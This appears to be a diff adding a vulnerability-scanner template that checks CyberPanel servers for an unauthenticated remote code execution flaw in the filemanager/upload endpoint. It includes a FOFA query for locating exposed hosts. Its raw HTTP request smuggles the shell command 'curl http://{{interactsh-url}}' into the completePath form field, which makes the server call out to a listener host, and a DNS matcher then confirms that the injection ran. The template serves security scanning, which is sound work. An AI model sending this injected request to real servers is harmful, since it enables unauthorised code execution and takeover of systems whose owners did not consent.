@@ -1,0 +1,45 @@
+id: CyberPanel-filemanager_upload-rce
+
+info:
+  name: "CyberPanel filemanager 接口未验证远程代码执行"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="CyberPanel"
+    该漏洞源于filemanager/upload接口缺乏身份验证机制及参数过滤不足，攻击者可通过该接口远程上传恶意文件以获取服务器控制权限，可能导致敏感数据泄露及系统被完全控制。当前该漏洞的技术细节与利用方式已在互联网公开，鉴于其潜在威胁范围广泛，建议用户立即进行安全检查并应用防护措施。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247489060&idx=1&sn=3dcf695d7bea75def3b195d0cabcf36f&chksm=c267a317f5102a01f55a969ce5bd719262f13e9d7d5ad3225467c0847578949a60e13e7b3a37&token=314927155&lang=zh_CN#rd
+  tags: CyberPanel
+
+
+http:
+- raw:
+  - |
+    POST /filemanager/upload HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+    Content-Type: multipart/form-data; boundary=----NewBoundary123456789
+
+    ------NewBoundary123456789
+    Content-Disposition: form-data; name="domainName"
+
+    <target>
+    ------NewBoundary123456789
+    Content-Disposition: form-data; name="completePath"
+
+    curl http://{{interactsh-url}}
+    ------NewBoundary123456789
+    Content-Disposition: form-data; name="file"; filename="poc.txt"
+
+    pwn
+    ------NewBoundary123456789--
+  matchers:
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
+
+
+
+
+
